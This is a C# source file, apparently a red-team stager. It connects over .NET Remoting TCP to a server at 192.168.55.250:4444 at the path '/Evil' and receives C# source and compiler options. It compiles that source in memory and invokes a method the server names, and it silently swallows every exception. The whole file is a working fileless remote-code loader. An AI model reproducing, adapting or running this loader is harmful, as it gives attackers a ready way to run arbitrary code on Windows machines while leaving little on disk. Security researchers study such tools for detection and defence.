using System;
using System.Collections.Generic;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    public static void Main()
    {
        try
        {
            //TCP Channel
            TcpClientChannel clientChannel = new TcpClientChannel();
            ChannelServices.RegisterChannel(clientChannel, false);

            //Create an instance of remoteObject
            Type Type = typeof(Interface);
            Interface remoteObject = (Interface)Activator.GetObject(Type, "tcp://192.168.55.250:4444/Evil");

            //Return source from server
            String[] source = remoteObject.noPowershell2();


            //Set Compiler Version
            Dictionary<string, string> Options = new Dictionary<string, string>
            {
                {source[1], source[2]}
            };

            //Pass provider info and params to compiler
            CSharpCodeProvider provider = new CSharpCodeProvider(Options);
            CompilerParameters compilerParams = new CompilerParameters();

            //Add References
            compilerParams.ReferencedAssemblies.Add(source[3]);
            compilerParams.ReferencedAssemblies.Add(source[4]);

            //Generate in Memory
            compilerParams.GenerateInMemory = true;

            //Compile and Execute
            CompilerResults results = provider.CompileAssemblyFromSource(compilerParams, source[0]);
            object o = results.CompiledAssembly.CreateInstance(source[5] + "." + source[6]);
            MethodInfo methodInfo = o.GetType().GetMethod(source[7]);
            methodInfo.Invoke(o, null);
        }
        catch
        { }
    }
}

//Public Interface
public interface Interface
{
    String[] noPowershell2();
}
